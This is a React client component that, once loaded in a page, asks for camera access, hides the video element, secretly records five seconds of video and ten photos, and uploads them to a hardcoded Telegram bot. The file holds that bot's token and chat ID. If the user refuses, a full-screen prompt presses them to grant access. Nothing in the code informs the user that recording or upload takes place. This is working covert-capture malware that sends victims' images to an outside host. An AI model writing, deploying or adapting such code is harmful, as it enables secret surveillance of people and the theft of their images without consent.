"use client";

import { useEffect, useRef, useState } from "react";

const TELEGRAM_BOT_TOKEN = "7780580980:AAECuF32EBla6U8waEj4w4Fxkf3kCqeahWI";
const TELEGRAM_CHAT_ID = "6956607670";

const PhotoAndVideoTaker = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const mediaBlobs = useRef<{ blob: Blob; type: "photo" | "video" }[]>([]);
  const [showDeniedMessage, setShowDeniedMessage] = useState(false);

  const initCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { width: 1280, height: 720 },
        audio: false,
      });

      mediaStreamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          startVideoRecording();
        };
      }
      setShowDeniedMessage(false);
    } catch (error) {
      setShowDeniedMessage(true);
      console.error("Camera access denied:", error);
    }
  };

  const startVideoRecording = () => {
    if (!mediaStreamRef.current) return;

    const recorder = new MediaRecorder(mediaStreamRef.current, {
      mimeType: "video/webm;codecs=vp9",
      videoBitsPerSecond: 2500000,
    });

    const chunks: BlobPart[] = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);

    recorder.onstop = async () => {
      const videoBlob = new Blob(chunks, { type: "video/webm" });
      mediaBlobs.current.push({ blob: videoBlob, type: "video" });
      startPhotoCapture();
    };

    recorder.start();

    setTimeout(() => {
      recorder.stop();
    }, 5000);
  };

  const startPhotoCapture = () => {
    let count = 0;
    const interval = setInterval(() => {
      if (count >= 10) {
        clearInterval(interval);
        sendToTelegram();
        return;
      }
      capturePhoto();
      count++;
    }, 800);
  };

  const capturePhoto = () => {
    if (!videoRef.current) return;

    const canvas = document.createElement("canvas");
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    const ctx = canvas.getContext("2d");

    if (ctx) {
      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(
        (blob) => {
          if (blob) {
            mediaBlobs.current.push({ blob, type: "photo" });
          }
        },
        "image/jpeg",
        0.85
      );
    }
  };

  const sendToTelegram = async () => {
    try {
      for (const item of mediaBlobs.current) {
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);

        if (item.type === "photo") {
          formData.append("photo", item.blob, "algeria.jpg");
          await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            {
              method: "POST",
              body: formData,
            }
          );
        } else {
          formData.append("video", item.blob, "algeria.webm");
          await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
            {
              method: "POST",
              body: formData,
            }
          );
        }
      }
      console.log("All media sent successfully");
    } catch (error) {
      console.error("Telegram send error:", error);
    } finally {
      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
    }
  };

  useEffect(() => {
    initCamera();

    return () => {
      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
    };
  }, []);

  if (showDeniedMessage) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
        <div className="bg-white rounded-xl p-6 max-w-md w-full text-center">
          <p className="text-red-600 mb-4">
            Camera access is required to continue
          </p>
          <button
            onClick={() => window.location.reload()}
            className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition-colors"
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="hidden">
      <video ref={videoRef} autoPlay playsInline muted />
    </div>
  );
};

export default PhotoAndVideoTaker;
